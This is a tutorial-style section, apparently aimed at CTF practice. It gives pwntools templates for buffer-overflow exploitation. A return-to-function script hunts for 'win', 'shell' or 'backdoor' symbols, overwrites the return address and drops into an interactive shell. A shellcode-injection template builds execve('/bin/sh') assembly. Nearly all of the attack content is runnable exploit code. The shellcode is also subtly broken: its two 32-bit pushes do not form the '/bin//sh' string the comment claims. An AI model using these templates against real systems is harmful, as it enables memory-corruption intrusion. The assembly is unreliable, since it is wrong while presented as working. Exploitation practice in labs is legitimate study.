# Exploitation Basics

### Return-to-Function

Most basic exploitation technique - redirect execution to existing function.

```python
# File: ret2func_template.py
#!/usr/bin/env python3

"""
Return-to-Function Exploitation Template
Redirects execution to existing function in binary
"""

from pwn import *
import sys

def analyze_binary(binary_path):
    """Analyze binary for useful functions"""
    elf = ELF(binary_path)

    log.info("Analyzing binary functions...")

    # Look for interesting functions
    interesting_funcs = []
    for func_name in elf.symbols:
        if any(keyword in func_name.lower() for keyword in
               ['win', 'shell', 'flag', 'secret', 'admin', 'backdoor']):
            address = elf.symbols[func_name]
            interesting_funcs.append((func_name, address))
            log.success(f"Found interesting function: {func_name} @ {hex(address)}")

    return interesting_funcs

def create_payload(offset, target_address):
    """Create ROP payload"""
    payload = b'A' * offset
    payload += p64(target_address)
    return payload

def exploit(binary_path, offset, target_function):
    """Execute the exploit"""
    log.info(f"Exploiting {binary_path}")
    log.info(f"Offset: {offset}")
    log.info(f"Target: {hex(target_function)}")

    p = process(binary_path)

    # Wait for input prompt
    try:
        p.recvuntil(b"name:", timeout=5)
    except:
        log.warning("No prompt received, sending payload anyway...")

    # Create and send payload
    payload = create_payload(offset, target_function)
    p.sendline(payload)

    # Check result
    try:
        response = p.recv(timeout=3)
        log.info(f"Response: {response}")

        # If we got a shell, interact
        if b"$" in response or b"#" in response:
            log.success("Got shell!")
            p.interactive()
        else:
            log.info("Exploit completed, no shell detected")

    except:
        log.info("No response received")

    p.close()

# Example usage template
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary_path>")
        sys.exit(1)

    binary_path = sys.argv[1]

    # Step 1: Analyze binary
    functions = analyze_binary(binary_path)

    if not functions:
        log.error("No interesting functions found!")
        sys.exit(1)

    # Step 2: Configure exploit (these need to be found through analysis)
    offset = 40  # TODO: Find through pattern analysis
    target_function = functions[0][1]  # Use first interesting function

    # Step 3: Execute exploit
    exploit(binary_path, offset, target_function)
```

### Shellcode Injection (Advanced)

```python
# File: shellcode_template.py
#!/usr/bin/env python3

"""
Shellcode Injection Template
For when you need to execute custom code
"""

from pwn import *

def create_shellcode():
    """Create simple execve('/bin/sh') shellcode"""
    # This is x86_64 shellcode for execve('/bin/sh')
    shellcode = asm("""
        /* execve('/bin/sh', NULL, NULL) */
        xor rdi, rdi
        mul rdi
        push rdx
        push 0x68732f2f
        push 0x6e69622f
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        mov al, 59
        syscall
    """)

    return shellcode

def exploit_with_shellcode(binary_path, offset, return_address):
    """Exploit using shellcode injection"""
    p = process(binary_path)

    # Create shellcode
    shellcode = create_shellcode()
    log.info(f"Shellcode length: {len(shellcode)} bytes")

    # Create payload
    # This assumes we can put shellcode in the buffer and jump to it
    payload = shellcode
    payload += b'A' * (offset - len(shellcode))
    payload += p64(return_address)  # Address of our shellcode

    # Send payload
    p.sendline(payload)
    p.interactive()

# Note: This template requires NX bit to be disabled
# Use checksec to verify: checksec --file=binary_name
```
